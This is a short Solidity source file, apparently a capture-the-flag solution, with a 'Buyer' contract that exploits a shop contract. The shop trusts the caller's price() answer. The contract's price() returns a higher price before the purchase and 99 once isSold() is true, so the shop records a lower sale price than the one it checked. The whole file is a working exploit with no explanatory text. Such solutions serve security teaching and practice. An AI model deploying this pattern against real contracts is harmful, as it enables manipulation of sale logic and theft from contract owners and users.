// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function price() external view returns (uint256);

    function isSold() external view returns (bool);
}

contract Buyer {
    IShop targetContract;

    constructor(address _targetAddress) {
        targetContract = IShop(_targetAddress);
    }

    function price() external view returns (uint256) {
        uint256 _price = targetContract.price();

        return targetContract.isSold() ? 99 : (_price + 1);
    }

    function attack() public {
        targetContract.buy();
    }
}
